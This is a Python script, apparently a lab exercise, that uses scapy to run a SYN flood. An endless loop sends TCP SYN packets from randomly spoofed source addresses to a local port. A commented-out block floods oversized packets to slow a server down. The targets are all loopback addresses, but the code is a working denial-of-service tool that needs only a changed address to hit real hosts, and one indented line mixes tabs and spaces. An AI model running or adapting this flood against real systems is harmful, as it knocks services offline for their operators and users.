import socket
from scapy.all import *

source = ["127.0.0.3", 80]
dest = ["127.0.0.2", 12000]
i = 1
'''
while True:
    IP1 = IP(src = source[0], dst = dest[0])
    TCP1 = TCP(sport = source[1], dport = dest[1])
    data = "This is a long packet so that the server has to convert this to slow down the server more."
    pkt = IP1/TCP1/Raw(load="This is a long packet so that the server has to convert this to slow down the server more.")
    #send(pkt, inter = 0.000001)
    #pkt = IP(dst=dest[0]) / TCP(dport=dest[1]) / Raw(load=data)
    send(pkt, count=100)
    #if(i%10 == 0):
    #    print("packet sent ", i)
    i += 1
'''

addr='127.0.0.2'
dport=12000
#sport=RandNum(1024,65535)

def partial_handshake():
    conf.L3socket = L3RawSocket
    while True:
        srcip = '127.' + str(random.randint(1,255)) + '.' + str(random.randint(1,255)) + '.' + str(random.randint(3,255))
        sport = random.randint(1024,65535)
        seq = random.randint(1000,99999999)
        syn_pkg = IP(src=srcip, dst=addr)/TCP(sport=sport, dport=dport, flags='S', seq=seq)
        #sr1(syn_pkg)
	send(syn_pkg)
        #syn_pkg.seq += 1
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#        s.bind((srcip,sport))
        #s.connect((addr,dport))
        #s = socket.socket()
        #s.connect(('127.0.0.2',dport))
        #s.send(bytes(syn_pkg))
    #syn_ack = sr1(syn_pkg)
    #seq = syn_ack[0][0][-1][TCP].seq
    #ack = syn_ack[0][0][-1][TCP].ack
    #syn_ack = sr1(syn_pkg)
    #seq = syn_ack[TCP].seq
    #ack = syn_ack[TCP].ack
    #ack_pkg = IP(dst=addr)/TCP(dport=dport, flags='A', seq=ack, ack=seq)
    #send(ack_pkg)
    #return (ack, seq)



def main():
    partial_handshake()


if __name__ == "__main__":
    main()

